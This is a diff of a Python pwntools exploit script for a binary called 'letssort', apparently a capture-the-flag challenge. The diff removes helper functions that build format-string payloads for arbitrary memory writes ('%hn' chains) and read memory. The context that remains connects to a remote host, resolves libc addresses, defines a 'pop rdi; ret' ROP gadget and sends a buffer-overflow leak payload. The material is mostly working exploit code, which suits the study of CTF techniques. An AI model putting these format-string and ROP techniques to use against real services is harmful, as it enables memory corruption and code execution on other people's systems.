@@ -5,7 +5,7 @@ import time
 import sys
 import random
 binaire='letssort'
-TIME=0.2
+TIME=0.3
 if (len(sys.argv)>1):
     elf=ELF(binaire)
     libc=ELF('libc.so.6')
@@ -108,120 +108,6 @@ def dumpg(debut,buffer):
         if (l % 16 == 0):
             print " ",""
     print " "
-def dumpgc(debut,buffer):
-    l=0
-    s=''
-    while (l<len(buffer)):
-        if (l %8 == 0):
-            print(baseN(debut+l,16,16)+" : "),
-        print baseN(bword(buffer[l:min(l+16,len(buffer))]),16,16)
-        l=l+8
-#        s=s+toprint(buffer[l])
-    print " "
-
-def liremem(debut,longueur):
-    l=0
-    buffer=""
-    while (l<longueur):
-        readbuffer=getzone(debut+l)
-        if (readbuffer[0:6]=="(null)"):
-            readbuffer=""
-        str=readbuffer
-        str=str+"\x00"
-        buffer=buffer+str
-        l=l+len(str)
-    return(buffer)
-# routine de format
-
-def strl(n,l=5):
-    s=str(n)
-    s="0"*max(0,l-len(s))+s
-    return(s)
-
-def fmt(x):
-    if (x < 8):
-        return("A"*x)
-    return("%"+str(x)+"x")
-
-
-def lchaine(lwhat,offset,nb=4):
-    lnom=[]
-    o=0
-    for w in lwhat:
-        w1=w&0xffff
-        o1=o
-        o=o+1
-        w2=w >> 16
-        if (w2 !=0):
-            o2=o
-            o=o+1
-            lnom=lnom+[(w1,o1),(w2,o2)]
-        else:
-            lnom=lnom+[(w1,o1)]
-    lnom.sort()
-    lf=[]
-    ind=0
-    lg=0
-    hn="$hn"
-    for c in lnom:
-        fm=fmt(c[0]-ind)+"%"
-        lf=lf+[(fm,c[1])]
-        ind=c[0]
-        lg=lg+len(fm)+len(str(baseN(offset,10,2)))+len(hn)
-    finnom='A'*((nb-(lg % nb)) % nb)
-    lg=lg+len(finnom)
-    indice=offset+(lg/nb)
-    nom=""
-    for f in lf:
-        nom=nom+f[0]+str(baseN(indice+f[1],10,2))+hn
-    nom=nom+finnom
-    print nom
-    return(nom)
-
-def lchaineverif(lwhat,offset,nb=4):
-    if (nb==4):
-        vv='8x'
-    else:
-        vv='lx'
-    lnom=[]
-    o=0
-    for w in lwhat:
-        w1=w&0xffff
-        o1=o
-        o=o+1
-        w2=w >> 16
-        if (w2 !=0):
-            o2=o
-            o=o+1
-            lnom=lnom+[(w1,o1),(w2,o2)]
-        else:
-            lnom=lnom+[(w1,o1)]
-    lnom.sort()
-    lf=[]
-    ind=0
-    lg=0
-    hn="$"+vv
-    for c in lnom:
-        fm="F"*len(fmt(c[0]-ind))+"%"
-        lf=lf+[(fm,c[1])]
-        ind=c[0]
-        lg=lg+len(fm)+len(str(baseN(offset,10,2)))+len(hn)
-    finnom='A'*((nb-(lg % nb)) % nb)
-    lg=lg+len(finnom)
-    indice=offset+(lg/nb)
-    nom=""
-    for f in lf:
-        nom=nom+f[0]+str(baseN(indice+f[1],10,2))+hn
-    nom=nom+finnom
-    print nom
-    return(nom)
-
-debug=1
-
-def pdebug(s):
-    if (debug==1):
-        print s
-    return(s)
 
 def tolibc(s):
     return(libc.sym[s]-libc.sym[reference_libc]+adr_reference_libc)
@@ -260,6 +146,7 @@ p=remote(host,port)
 def test(s):
     print "s=",s
     print "accueil ->",
+#    p.recvuntil("put?")
     p.sendline("5000")
     time.sleep(TIME)
     p.sendline(s)
@@ -269,10 +156,17 @@ def test(s):
     print "*************"
     return(b)
 
+'''
+print sp
+h=trie(sp)
+print h[0]
+for i in range(6):
+    print "->",h[1][i]
+'''
 poprdi=0x0000000000001243 # : pop rdi ; ret
 
 print test("glopglop")
-
+#
 fuite=1024+128
 leak="a\x00"+"b"*fuite
 b=test(leak)
